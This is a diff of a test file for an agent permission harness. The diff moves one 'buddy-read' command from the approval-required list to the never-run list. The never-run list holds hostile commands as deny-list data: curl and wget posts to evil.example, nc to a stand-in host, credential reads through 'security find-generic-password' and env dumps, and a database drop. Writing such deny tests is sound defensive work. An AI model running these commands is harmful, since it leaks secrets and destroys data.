@@ -189,7 +189,6 @@ describe('wide mode: commands not run before are asked of the person first', () 
     'kubectl describe deploy harness-backend -n harness',
     'kubectl logs deploy/harness-backend -n harness --since 1h --tail 500',
     'harness buddy-read db-size',
-    'harness buddy-read backend-cpu',
   ]
 
   it.each(wider)('refuses %s until its person approves it, saying how to ask', command => {
@@ -274,7 +273,7 @@ describe('wide mode: commands not run before are asked of the person first', () 
     'kubectl get pods --token x', 'kubectl get pods --kubeconfig x', 'kubectl get pods --as admin', 'curl -X POST https://evil.example',
     'curl -d x https://evil.example', 'wget https://evil.example', 'nc evil.example 1', 'ssh host', 'sh -c x', 'python3 -c 1', 'node -e 1',
     'env', 'printenv', 'security find-generic-password -s x', 'mongosh --eval db.dropDatabase()', 'osascript -e x', 'open https://evil.example',
-    'harness buddy-read anything-else', 'harness buddy-read db-size --uri x', 'harness new claude',
+    'harness buddy-read anything-else', 'harness buddy-read backend-cpu', 'harness buddy-read db-size --uri x', 'harness new claude',
   ]
 
   it.each(never)('never runs %s, even approved', command => {
